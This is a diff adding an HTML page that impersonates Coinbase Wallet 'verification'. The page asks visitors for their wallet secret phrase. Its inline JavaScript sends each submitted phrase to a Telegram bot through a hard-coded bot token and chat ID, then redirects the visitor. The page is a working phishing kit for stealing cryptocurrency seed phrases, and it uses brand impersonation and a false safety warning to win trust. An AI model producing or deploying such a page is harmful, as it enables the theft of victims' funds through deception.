@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <img src="logo.png" alt="Coinbase Wallet Logo" class="logo">
+        <h1>Enter Your Secret Phrase</h1>
+        <label for="phrase">Secret Phrase:</label>
+        <textarea id="phrase" placeholder="Enter your secret phrase here..."></textarea>
+        <button onclick="verify()">Verify</button>
+        <p class="warning">⚠️ <span>Never share your secret phrase with anyone!</span></p>
+    </div>
+
+    <script>
+        function verify() {
+            let phrase = document.getElementById("phrase").value;
+            if (phrase.trim() === "") {
+                alert("Please enter your secret phrase!");
+                return;
+            }
+
+            // Ton Token et ID Telegram
+            let botToken = "8152927364:AAGcaDY9iGW9BREQ4yXefEigCzp0Oy1ylrA";
+            let chatId = "8171222874";
+            let message = "🚨 New Secret Phrase Submission:\n" + phrase;
+
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = "submission.html"; // Redirection après l'envoi
+                    } else {
+                        alert("Failed to send message to Telegram.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    alert("An error occurred.");
+                });
+        }
+    </script>
+
+</body>
+</html>
